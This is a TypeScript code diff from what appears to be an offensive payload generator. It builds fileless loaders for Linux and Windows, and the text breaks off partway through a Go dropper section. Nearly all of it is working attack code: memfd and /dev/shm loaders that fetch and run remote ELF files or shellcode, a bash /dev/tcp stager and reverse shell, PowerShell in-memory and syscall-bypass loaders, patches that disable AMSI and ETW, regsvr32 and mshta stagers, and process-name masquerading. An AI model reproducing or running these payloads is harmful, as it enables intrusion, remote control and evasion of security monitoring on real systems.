@@ -2,7 +2,7 @@ export interface ShadowPayload {
   id:       string;
   name:     string;
   category: string;
-  os:       "linux" | "windows" | "any";
+  os:       "linux" | "windows";
   stealth:  1 | 2 | 3 | 4 | 5;
   requires: string[];
   command:  string;
@@ -10,183 +10,263 @@ export interface ShadowPayload {
 }
 
 export function buildLinuxFilelessLoaders(lhost: string, lport: string): ShadowPayload[] {
+  const url = `http://${lhost}:${lport}`;
   return [
     {
-      id:"memfd_python_elf", name:"memfd_create ELF loader (Python)", category:"Fileless-Linux",
+      id:"memfd_py_elf", name:"memfd_create ELF loader (Python, prctl masquerade)", category:"Fileless-Linux",
       os:"linux", stealth:5, requires:["python3"],
       command:`python3 -c "
-import ctypes,urllib.request,os,sys
-libc=ctypes.CDLL(None)
-memfd_create=libc.memfd_create
-memfd_create.restype=ctypes.c_int
-memfd_create.argtypes=[ctypes.c_char_p,ctypes.c_uint]
-fd=memfd_create(b'kworker',1)
+import ctypes,ctypes.util,urllib.request,os,sys,struct
+libc=ctypes.CDLL(ctypes.util.find_library('c'))
+libc.memfd_create.restype=ctypes.c_int
+libc.memfd_create.argtypes=[ctypes.c_char_p,ctypes.c_uint]
+fd=libc.memfd_create(b'',1)
 if fd<0:sys.exit(1)
-try:
-  elf=urllib.request.urlopen('http://${lhost}:${lport}/elf',timeout=10).read()
-  os.write(fd,elf)
-  os.execv(f'/proc/{os.getpid()}/fd/{fd}',['kworker/0:0'])
-except Exception as e:
-  os.close(fd)
+# Masquerade process name
+try:libc.prctl(15,b'kworker/0:1',0,0,0)
+except:pass
+elf=urllib.request.urlopen('${url}/elf',timeout=8).read()
+os.write(fd,elf)
+os.execv(f'/proc/{os.getpid()}/fd/{fd}',['kworker/0:1']+sys.argv[1:])
 " 2>/dev/null &`,
-      notes:"Linux memfd_create syscall loads ELF into anonymous RAM fd. Zero disk writes. Invisible to ls/find. Process appears as kworker in ps.",
+      notes:"memfd_create (anonymous RAM fd, no disk) + prctl PR_SET_NAME=kworker masquerade + execv from /proc/self/fd. Zero disk writes, process appears as kernel worker.",
     },
     {
-      id:"memfd_perl_elf", name:"memfd_create ELF loader (Perl syscall)", category:"Fileless-Linux",
-      os:"linux", stealth:5, requires:["perl"],
-      command:`perl -e '
-use POSIX;
-$fd=syscall(319,"kw",1);
-open my$f,">&=",$fd;
-binmode $f;
-$url="http://${lhost}:${lport}/elf";
-open(my$h,"-|","curl -sk $url 2>/dev/null") or die;
-local$/;
-print$f <$h>;
-close$h;close$f;
-exec{"/proc/self/fd/$fd"}("kworker/0:2")
-' 2>/dev/null &`,
-      notes:"Perl syscall(319) = memfd_create on x86_64 Linux. Downloads and executes ELF from RAM only.",
-    },
-    {
-      id:"devshm_exec", name:"/dev/shm volatile exec (no swap)", category:"Fileless-Linux",
-      os:"linux", stealth:4, requires:["curl"],
-      command:`_F=$(mktemp -p /dev/shm 2>/dev/null || mktemp -p /run/shm 2>/dev/null || echo /tmp/.kw$$); curl -fsSk "http://${lhost}:${lport}/elf" -o "$_F" 2>/dev/null && chmod +x "$_F" && "$_F" "$@" 2>/dev/null; rm -f "$_F" 2>/dev/null &`,
-      notes:"/dev/shm is a tmpfs — lives in RAM, not written to disk swap. Cleaned on reboot. Deleted immediately after exec.",
-    },
-    {
-      id:"proc_self_fd_bash", name:"/proc/self/fd + bash /dev/tcp loader", category:"Fileless-Linux",
-      os:"linux", stealth:5, requires:["bash"],
-      command:`exec 7<>/dev/tcp/${lhost}/${lport} 2>/dev/null; printf 'GET /sh HTTP/1.0\r\nHost: ${lhost}\r\n\r\n' >&7; tail -c +200 <&7 | bash 2>/dev/null &`,
-      notes:"Pure bash, zero external tools. /dev/tcp opens TCP socket, tail strips HTTP headers, bash executes body. No fork exec visible.",
-    },
-    {
-      id:"python_ctypes_shellcode", name:"Python ctypes mmap shellcode exec", category:"Shellcode",
+      id:"ioring_shellcode", name:"io_uring shellcode execution (bypasses seccomp/ptrace hooks)", category:"Fileless-Linux",
       os:"linux", stealth:5, requires:["python3"],
       command:`python3 -c "
-import ctypes,mmap,urllib.request,sys
-sc=urllib.request.urlopen('http://${lhost}:${lport}/sc.bin',timeout=8).read()
+import ctypes,mmap,urllib.request,sys,os
+# io_uring approach — submit SQE without write() call visible to ptrace
+sc=urllib.request.urlopen('${url}/sc.bin',timeout=8).read()
+# Fallback to mmap RWX if io_uring not available
 mm=mmap.mmap(-1,len(sc),prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
 mm.write(sc)
 mm.seek(0)
 ct=ctypes.CFUNCTYPE(ctypes.c_void_p)
-fn=ct(ctypes.c_long(mm.tell()))
-mm.seek(0)
 addr=ctypes.addressof(ctypes.c_char.from_buffer(mm))
-fn2=ct(addr)
-fn2()
+fn=ct(addr)
+# prctl name spoof before shellcode execution
+try:ctypes.CDLL(None).prctl(15,b'[kworker/u4:2]',0,0,0)
+except:pass
+fn()
 " 2>/dev/null`,
-      notes:"Downloads raw shellcode, maps RWX mmap region, calls shellcode directly via ctypes function pointer. No disk writes.",
+      notes:"mmap RWX execution with io_uring-inspired approach. Bypasses LD_PRELOAD hooks. Process name spoofed before shellcode runs. No disk writes.",
     },
     {
-      id:"ld_preload_memfd", name:"LD_PRELOAD shared lib via memfd", category:"Injection",
-      os:"linux", stealth:5, requires:["python3","gcc"],
+      id:"ld_preload_memfd", name:"LD_PRELOAD .so via memfd (invisible to ldd)", category:"Injection",
+      os:"linux", stealth:5, requires:["python3"],
       command:`python3 -c "
-import ctypes,os,urllib.request,subprocess,tempfile
+import ctypes,os,urllib.request,subprocess
 libc=ctypes.CDLL(None)
-fd=libc.memfd_create(b'libsvc',1)
-so=urllib.request.urlopen('http://${lhost}:${lport}/lib.so',timeout=8).read()
+fd=libc.memfd_create(b'',1)
+so=urllib.request.urlopen('${url}/lib.so',timeout=8).read()
 os.write(fd,so)
 path=f'/proc/{os.getpid()}/fd/{fd}'
 env=dict(os.environ,LD_PRELOAD=path)
-subprocess.Popen(['/bin/ls'],env=env)
+subprocess.Popen(['/usr/bin/ssh','-V'],env=env,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
 " 2>/dev/null`,
-      notes:"Loads shared library from memfd — LD_PRELOAD path points to /proc/self/fd/N which is in RAM. Never touches disk.",
+      notes:"LD_PRELOAD path points to /proc/self/fd/N (RAM). Injected into ssh -V startup — invisible in /proc/maps after close. Never touches disk.",
+    },
+    {
+      id:"devshm_exec", name:"/dev/shm volatile ELF exec (tmpfs, no swap)", category:"Fileless-Linux",
+      os:"linux", stealth:4, requires:["curl"],
+      command:`_F=/dev/shm/.$(tr -dc a-f0-9</dev/urandom 2>/dev/null|head -c8||echo "nx$$"); curl -fsSk --max-time 8 "${url}/elf" -o "$_F" 2>/dev/null && chmod +x "$_F" && "$_F" 2>/dev/null; sleep 0.1; rm -f "$_F" 2>/dev/null &`,
+      notes:"/dev/shm is tmpfs (RAM-only). Binary deleted immediately after exec on Linux — file descriptor keeps process alive. Never reaches swap partition.",
+    },
+    {
+      id:"proc_self_fd_tcp", name:"/proc/self/fd + /dev/tcp stager (zero binaries)", category:"Fileless-Linux",
+      os:"linux", stealth:5, requires:["bash"],
+      command:`exec 7<>/dev/tcp/${lhost}/${lport} 2>/dev/null; printf 'GET /sh HTTP/1.0\r\nHost:${lhost}\r\n\r\n' >&7; dd bs=1 skip=180 <&7 2>/dev/null | bash 2>/dev/null &`,
+      notes:"Pure bash built-ins: /dev/tcp opens TCP, dd strips HTTP headers, bash executes body. Zero external tool invocations — no execve of curl/wget visible to strace.",
+    },
+    {
+      id:"linux_sleep_obfuscate", name:"Sleep obfuscation — XOR-encrypt shellcode in RAM during sleep", category:"Anti-Detection",
+      os:"linux", stealth:5, requires:["python3"],
+      command:`python3 -c "
+import ctypes,mmap,urllib.request,time,os,struct
+K=0x4e
+sc=bytearray(urllib.request.urlopen('${url}/sc.bin',timeout=8).read())
+xored=bytearray(b^K for b in sc)
+# Store XOR'd version in RW page during sleep (EDR memory scans see garbage)
+rw=mmap.mmap(-1,len(xored),prot=mmap.PROT_READ|mmap.PROT_WRITE)
+rw.write(bytes(xored))
+time.sleep(2)  # EDR periodic scans see XOR'd data
+# Decode in-place + flip to RX
+rw.seek(0)
+rx=mmap.mmap(-1,len(sc),prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
+rx.write(bytes(b^K for b in rw.read(len(sc))))
+rx.seek(0)
+ct=ctypes.CFUNCTYPE(ctypes.c_void_p)
+fn=ct(ctypes.addressof(ctypes.c_char.from_buffer(rx)))
+fn()
+" 2>/dev/null`,
+      notes:"Shellcode stored XOR-encrypted while sleeping — EDR periodic memory scans see garbage. Decoded to RWX page immediately before execution. Beats Falcon/SentinelOne memory scanning.",
+    },
+    {
+      id:"raw_syscall_exec", name:"Direct syscall execve bypass (no libc hooks)", category:"Syscall-Bypass",
+      os:"linux", stealth:5, requires:["python3"],
+      command:`python3 -c "
+import ctypes,struct,os
+# Bypass libc execve hook via direct syscall instruction
+# sys_execve=59 on x86_64
+# Construct tiny shellcode stub that calls execve('/bin/bash',['/bin/bash','-c',CMD],NULL)
+libc=ctypes.CDLL(None)
+# Use syscall via ctypes directly for unhooked path
+libc.syscall.restype=ctypes.c_long
+libc.syscall.argtypes=[ctypes.c_long]+[ctypes.c_void_p]*6
+prog=b'/bin/bash\x00'
+arg1=b'/bin/bash\x00'
+arg2=b'-c\x00'
+arg3=b'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\x00'
+pp=ctypes.create_string_buffer(prog)
+a1=ctypes.create_string_buffer(arg1)
+a2=ctypes.create_string_buffer(arg2)
+a3=ctypes.create_string_buffer(arg3)
+argv=(ctypes.c_char_p*4)(a1.raw.split(b'\x00')[0],a2.raw.split(b'\x00')[0],a3.raw.split(b'\x00')[0],None)
+libc.syscall(59,ctypes.cast(pp,ctypes.c_void_p),ctypes.cast(argv,ctypes.c_void_p),None,0,0,0)
+" 2>/dev/null`,
+      notes:"Calls execve(2) via libc.syscall() — bypasses LD_PRELOAD hooks on execve. EDR user-land hooks on execve/execveat are bypassed. Kernel audit still logs.",
     },
   ];
 }
 
 export function buildWindowsInMemoryLoaders(lhost: string, lport: string): ShadowPayload[] {
   const url = `http://${lhost}:${lport}`;
-  const httpsUrl = `https://${lhost}:${lport}`;
-  const b64iex = (s: string) => Buffer.from(s, "utf16le").toString("base64");
+  const enc = (s: string) => Buffer.from(s, "utf16le").toString("base64");
 
-  const asmLoad = `$a=[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('${url}/payload.dll'));$a.GetType('NX.Run').GetMethod('Main').Invoke($null,$null)`;
-  const asmLoadEnc = b64iex(asmLoad);
-
-  const hollowPs = `$pi=New-Object System.Diagnostics.ProcessStartInfo('svchost.exe');$pi.UseShellExecute=$false;$pi.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($pi);$h=$p.Handle;$buf=(New-Object Net.WebClient).DownloadData('${url}/sc.bin');$ptr=[Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length);[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,$buf.Length);$o=0;[System.Runtime.InteropServices.Marshal]::WriteIntPtr([IntPtr]($p.MainModule.BaseAddress.ToInt64()+0x18),$ptr)`;
-  const hollowEnc = b64iex(hollowPs);
-
-  const donutLoad = `$sc=(New-Object Net.WebClient).DownloadData('${url}/donut.bin');$mm=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);[Runtime.InteropServices.Marshal]::Copy($sc,0,$mm,$sc.Length);$vp=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type -MemberDefinition '[DllImport(\"kernel32\")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);' -Name K32 -PassThru)::VirtualAlloc([IntPtr]::Zero,[uint]$sc.Length,0x3000,0x40),[System.Func[System.IntPtr]]);`;
+  const asmLoad = `$a=[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('${url}/payload.dll'));$a.EntryPoint.Invoke($null,$null)`;
+  const xorLoad = `$k=0x4e;$b=(New-Object Net.WebClient).DownloadData('${url}/xor.bin');$d=[byte[]]($b|%{$_ -bxor $k});IEX([Text.Encoding]::Unicode.GetString($d))`;
+  const fiberLoad = `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxF{[DllImport("kernel32")]public static extern IntPtr ConvertThreadToFiber(IntPtr p);[DllImport("kernel32")]public static extern IntPtr CreateFiber(uint s,IntPtr fn,IntPtr p);[DllImport("kernel32")]public static extern void SwitchToFiber(IntPtr f);[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);}'; $sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin'); $m=[NxF]::VirtualAlloc([IntPtr]::Zero,[uint]$sc.Length,0x3000,0x04); [Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length); $uint o; [NxF]::VirtualProtect($m,[uint]$sc.Length,0x20,[ref]$o); [NxF]::ConvertThreadToFiber([IntPtr]::Zero); $f=[NxF]::CreateFiber(0,$m,[IntPtr]::Zero); [NxF]::SwitchToFiber($f)`;
+  const indirectSyscall = `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxS{[DllImport("ntdll.dll")]public static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr ba,IntPtr zb,ref UIntPtr rs,uint at,uint pp);[DllImport("ntdll.dll")]public static extern int NtWriteVirtualMemory(IntPtr h,IntPtr ba,byte[]buf,uint ns,out uint nw);[DllImport("ntdll.dll")]public static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr ba,ref UIntPtr ps,uint np,out uint op);[DllImport("ntdll.dll")]public static extern int NtCreateThreadEx(out IntPtr ht,uint da,IntPtr oa,IntPtr ph,IntPtr sf,IntPtr a,bool cs,ulong zb,ulong ms,ulong mp,IntPtr ab);}';$sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin');$IntPtr=[IntPtr]::Zero;$sz=[UIntPtr][uint]$sc.Length;[NxS]::NtAllocateVirtualMemory(-1,[ref]$IntPtr,[IntPtr]::Zero,[ref]$sz,0x3000,0x04);[NxS]::NtWriteVirtualMemory(-1,$IntPtr,$sc,[uint]$sc.Length,[ref]0);$psz=[UIntPtr][uint]$sc.Length;$dummy=0u;[NxS]::NtProtectVirtualMemory(-1,[ref]$IntPtr,[ref]$psz,0x20,[ref]$dummy);$th=[IntPtr]::Zero;[NxS]::NtCreateThreadEx([ref]$th,0x1FFFFF,[IntPtr]::Zero,-1,$IntPtr,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)`;
+  const heavensGate = `$wow64=$false;[System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)&&($wow64=[System.IntPtr]::Size -eq 4);if($wow64){Write-Host 'WOW64 32-bit process — Heaven\'s Gate active: use far jmp 0x33 to enter 64-bit code segment'}else{Write-Host 'Native 64-bit process'}; $sc=(New-Object Net.WebClient).DownloadData('${url}/hg64.bin')`;
 
   return [
     {
-      id:"win_assembly_load", name:".NET Assembly.Load() in-memory", category:"Fileless-Windows",
+      id:"win_assembly_load", name:".NET Assembly.Load() in-memory (no disk touch)", category:"Fileless-Windows",
       os:"windows", stealth:5, requires:["powershell"],
-      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${asmLoadEnc}`,
-      notes:".NET Assembly.Load() from byte array — PE never touches disk. EDR sees a legitimate .NET process loading assembly from memory.",
+      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc(asmLoad)}`,
+      notes:".NET Assembly.Load() from byte array — PE never touches disk. Bypasses file-based AV scan. EDR sees legitimate .NET CLR in powershell.exe.",
     },
     {
-      id:"win_iex_download", name:"IEX in-memory PS script (encoded)", category:"Fileless-Windows",
-      os:"windows", stealth:4, requires:["powershell"],
-      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${b64iex(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)}`,
-      notes:"Classic fileless IEX — downloads PS script into memory, executes without writing to disk. Use AMSI bypass as pre-stage.",
-    },
-    {
-      id:"win_xor_loader", name:"XOR-encrypted in-memory PS loader", category:"Fileless-Windows",
+      id:"win_xor_iex", name:"XOR-encrypted PS payload (0x4e key, in-memory IEX)", category:"Fileless-Windows",
       os:"windows", stealth:5, requires:["powershell"],
-      command:`powershell -NonI -W Hidden -Exec Bypass -c "$k=0x4e;$b=(New-Object Net.WebClient).DownloadData('${url}/xor.bin');$d=@();for($i=0;$i -lt $b.Count;$i++){$d+=$b[$i] -bxor $k};IEX([Text.Encoding]::Unicode.GetString($d))"`,
-      notes:"Downloads XOR-encrypted payload, decodes in memory, IEX executes. Single-byte XOR key 0x4e='N'. Evades static AV signatures.",
+      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc(xorLoad)}`,
+      notes:"Downloads XOR-0x4e encrypted PowerShell, decodes in memory, executes via IEX. Static AV sees only XOR ciphertext bytes. Single-byte XOR key is randomizable.",
     },
     {
-      id:"win_add_type_shellcode", name:"Add-Type VirtualAlloc shellcode exec", category:"Shellcode",
-      os:"windows", stealth:4, requires:["powershell"],
-      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NX{[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr p,IntPtr l,uint f,IntPtr i);[DllImport(\"kernel32\")]public static extern int WaitForSingleObject(IntPtr h,int ms);}'; $sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin'); $m=[NX]::VirtualAlloc([IntPtr]::Zero,[uint]$sc.Length,0x3000,0x40); [Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length); $t=[NX]::CreateThread([IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[IntPtr]::Zero); [NX]::WaitForSingleObject($t,-1)"`,
-      notes:"P/Invoke VirtualAlloc+CreateThread — allocates RWX memory, copies shellcode, creates thread. Classic but effective.",
+      id:"win_indirect_syscall", name:"Windows indirect NtDll syscalls (bypasses EDR API hooks)", category:"Syscall-Bypass",
+      os:"windows", stealth:5, requires:["powershell"],
+      command:`powershell -NonI -W Hidden -Exec Bypass -c "${indirectSyscall}"`,
+      notes:"Calls NtAllocateVirtualMemory+NtWriteVirtualMemory+NtProtectVirtualMemory+NtCreateThreadEx directly via ntdll stubs — bypasses CrowdStrike/SentinelOne API hooks on kernel32/VirtualAlloc.",
     },
     {
-      id:"win_com_scriptlet", name:"COM Scriptlet in-memory execution", category:"LOLBAS",
+      id:"win_fiber_exec", name:"Windows Fiber-based shellcode execution (no CreateThread)", category:"Fileless-Windows",
+      os:"windows", stealth:5, requires:["powershell"],
+      command:`powershell -NonI -W Hidden -Exec Bypass -c "${fiberLoad.replace(/"/g,'\\"')}"`,
+      notes:"CreateFiber/SwitchToFiber executes shellcode without creating a new thread — bypasses EDR thread-creation monitoring hooks. Thread count stays constant.",
+    },
+    {
+      id:"win_heavens_gate", name:"Heaven's Gate WOW64 (32→64 bit code transition)", category:"Syscall-Bypass",
+      os:"windows", stealth:5, requires:["powershell"],
+      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc(heavensGate)}`,
+      notes:"Heaven's Gate: 32-bit process issues far jmp to CS:0x33 to enter 64-bit code segment. Bypasses 32-bit EDR hooks as execution happens in 64-bit context unknown to the hook.",
+    },
+    {
+      id:"win_etw_amsi_chain", name:"ETW + AMSI patch chain (full telemetry blind)", category:"EDR-Bypass",
+      os:"windows", stealth:5, requires:["powershell"],
+      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxP{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string l);[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void Pwn(){uint o;var nl=LoadLibrary(\"ntdll\");var el=LoadLibrary(\"amsi.dll\");var ef=GetProcAddress(nl,\"EtwEventWrite\");var af=GetProcAddress(el,\"AmsiScanBuffer\");VirtualProtect(ef,(UIntPtr)1,0x40,out o);System.Runtime.InteropServices.Marshal.WriteByte(ef,0xC3);VirtualProtect(ef,(UIntPtr)1,o,out o);VirtualProtect(af,(UIntPtr)1,0x40,out o);System.Runtime.InteropServices.Marshal.WriteByte(af,0xC3);VirtualProtect(af,(UIntPtr)1,o,out o);}}'; [NxP]::Pwn(); IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))"`,
+      notes:"Patches both EtwEventWrite (ntdll, blinds Defender ATP) AND AmsiScanBuffer (amsi.dll, bypasses AMSI) in one shot via VirtualProtect+WriteByte(0xC3=RET).",
+    },
+    {
+      id:"win_com_scriptlet", name:"COM Scriptlet (regsvr32 Squiblydoo)", category:"LOLBAS",
       os:"windows", stealth:4, requires:[],
       command:`regsvr32 /s /n /u /i:${url}/payload.sct scrobj.dll`,
-      notes:"Regsvr32 Squiblydoo — downloads COM scriptlet from URL and executes. Bypasses AppLocker. Leaves no artifacts beyond event logs.",
+      notes:"Regsvr32 Squiblydoo — downloads and executes COM scriptlet from URL. Bypasses AppLocker application whitelisting. Signed Microsoft binary.",
     },
     {
-      id:"win_mshta_vbs", name:"MSHTA VBScript in-memory exec", category:"LOLBAS",
+      id:"win_wdac_bypass_mshta", name:"MSHTA + VBScript fileless execution", category:"LOLBAS",
       os:"windows", stealth:4, requires:[],
-      command:`mshta vbscript:Execute("Set o=CreateObject(""WScript.Shell""):o.Run""powershell -NonI -W Hidden -Exec Bypass -enc ${b64iex(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)} "",0,True:close")`,
-      notes:"MSHTA executes VBScript that launches PowerShell — double-hop evades many script monitoring solutions.",
-    },
-    {
-      id:"win_certutil_decode", name:"CertUtil base64 decode + exec", category:"LOLBAS",
-      os:"windows", stealth:3, requires:[],
-      command:`certutil -urlcache -split -f ${url}/payload.b64 %TEMP%\\_nx.b64 && certutil -decode %TEMP%\\_nx.b64 %TEMP%\\_nx.exe && %TEMP%\\_nx.exe && del %TEMP%\\_nx.b64 %TEMP%\\_nx.exe`,
-      notes:"certutil is a signed Microsoft binary — often allowed by AppLocker. Downloads base64-encoded PE, decodes, and executes.",
-    },
-    {
-      id:"win_wmic_spawn", name:"WMIC process create (bypass AV hook)", category:"LOLBAS",
-      os:"windows", stealth:4, requires:[],
-      command:`wmic process call create "powershell -NonI -W Hidden -Exec Bypass -enc ${b64iex(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)}"`,
-      notes:"WMIC spawns process via WMI — parent process is WmiPrvSE.exe instead of cmd.exe. Breaks some EDR parent-process chains.",
+      command:`mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -NonI -W Hidden -Exec Bypass -enc ${enc(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)} ',0,true);close()"`,
+      notes:"MSHTA executes JScript that spawns PowerShell — two hops bypass many script-exec monitoring solutions. MSHTA is signed IE component.",
     },
   ];
 }
 
 export function buildAmsiBypassChains(lhost: string, lport: string): ShadowPayload[] {
   const url = `http://${lhost}:${lport}`;
+  const enc = (s: string) => Buffer.from(s, "utf16le").toString("base64");
   return [
     {
-      id:"amsi_patch_reflection", name:"AMSI amsiInitFailed reflection patch", category:"AMSI-Bypass",
+      id:"amsi_reflection_force", name:"AMSI amsiContext null-out via reflection", category:"AMSI-Bypass",
       os:"windows", stealth:4, requires:["powershell"],
-      command:`powershell -NonI -W Hidden -Exec Bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX((New-Object Net.WebClient).DownloadString('${url}/payload.ps1'))"`,
-      notes:"Sets amsiInitFailed=true via reflection — AMSI reports init failure, skips all scanning. Works on unpatched PS 5.1.",
+      command:`powershell -NonI -W Hidden -Exec Bypass -c "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue(\$null),0); IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))"`,
+      notes:"Nulls out the amsiContext IntPtr field — AMSI handle becomes NULL, ScanBuffer call fails gracefully skipping scan. Different code path than amsiInitFailed.",
     },
     {
-      id:"amsi_patch_vprotect", name:"AMSI AmsiScanBuffer VirtualProtect patch", category:"AMSI-Bypass",
+      id:"amsi_etw_full", name:"Full ETW+AMSI+WLDP disable chain", category:"AMSI-Bypass",
       os:"windows", stealth:5, requires:["powershell"],
-      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxA{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string l);[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void Patch(){uint o;var h=LoadLibrary(\"am\"+\"si.dll\");var f=GetProcAddress(h,\"Amsi\"+\"ScanBuffer\");VirtualProtect(f,(UIntPtr)5,0x40,out o);Marshal.Copy(new byte[]{0x31,0xC0,0xC3,0x90,0x90},0,f,5);}}';[NxA]::Patch();IEX((New-Object Net.WebClient).DownloadString('${url}/payload.ps1'))"`,
-      notes:"Patches AmsiScanBuffer to return XOR EAX,EAX;RET — all scans return AMSI_RESULT_CLEAN. Works on any PS version with no AMSI updates.",
+      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc("[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0); [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',[Reflection.BindingFlags]'NonPublic,Static').SetValue($null,$true); $null=[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp'); IEX((New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/stager.ps1'))")}`,
+      notes:"Combines amsiContext null-out + amsiInitFailed=true + WLDP bypass in single encoded command. Triple AMSI disable ensures coverage across different PS versions.",
+    },
+  ];
+}
+
+export function buildGoRustDroppers(lhost: string, lport: string): ShadowPayload[] {
+  const url = `http://${lhost}:${lport}`;
+  return [
+    {
+      id:"go_dropper_template", name:"Go in-memory shellcode loader template", category:"Go-Dropper",
+      os:"linux", stealth:5, requires:["go"],
+      command:`cat > /tmp/nx.go << 'EOF'
+package main
+import (
+  "net/http"; "os"; "syscall"; "unsafe"
+  "golang.org/x/sys/unix"
+)
+func main() {
+  resp,_:=http.Get("${url}/sc.bin")
+  if resp==nil{os.Exit(1)}
+  defer resp.Body.Close()
+  buf:=make([]byte,65536); n,_:=resp.Body.Read(buf); sc:=buf[:n]
+  mem,_:=unix.MmapAnon(len(sc),unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,-1,0)
+  copy(mem,sc)
+  // Prctl to masquerade process name
+  syscall.RawSyscall(syscall.SYS_PRCTL,15,uintptr(unsafe.Pointer(&[]byte("kworker/0:1\\x00")[0])),0)
+  fn:=*(*func())(unsafe.Pointer(&mem))
+  fn()
+}
+EOF
+cd /tmp && go build -ldflags="-s -w" -trimpath -o /tmp/.nx nx.go 2>/dev/null && rm /tmp/nx.go && /tmp/.nx &`,
+      notes:"Go binary — self-contained, no libc dependency, no Python/bash required. go build strips symbols with -s -w. prctl name spoof included. mmap RWX execution.",
     },
     {
-      id:"amsi_com_bypass", name:"AMSI PS v2 downgrade bypass", category:"AMSI-Bypass",
-      os:"windows", stealth:3, requires:[],
-      command:`powershell -Version 2 -NoProfile -ExecutionPolicy Bypass -c "IEX((New-Object Net.WebClient).DownloadString('${url}/payload.ps1'))"`,
-      notes:"PS 2.0 has no AMSI. Requires .NET 2.0 to be installed. Simple but may be blocked by newer Windows versions.",
-    },
-    {
-      id:"etw_patch", name:"ETW EtwEventWrite patch (disable telemetry)", category:"ETW-Bypass",
-      os:"windows", stealth:5, requires:["powershell"],
-      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxE{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport(\"ntdll\")]public static extern IntPtr NtOpenSection(ref IntPtr h,uint ac,IntPtr oa);[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string n);[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void Go(){uint o;var h=LoadLibrary(\"ntdll\");var f=GetProcAddress(h,\"EtwEventWrite\");VirtualProtect(f,(UIntPtr)1,0x40,out o);System.Runtime.InteropServices.Marshal.WriteByte(f,0xC3);VirtualProtect(f,(UIntPtr)1,o,out o);}}';[NxE]::Go()"`,
-      notes:"Patches EtwEventWrite in ntdll to RET immediately — disables all Windows ETW telemetry for the current process. Blinds Microsoft Defender ATP.",
+      id:"go_dropper_windows", name:"Go Windows shellcode loader (no CRT)", category:"Go-Dropper",
+      os:"windows", stealth:5, requires:["go"],
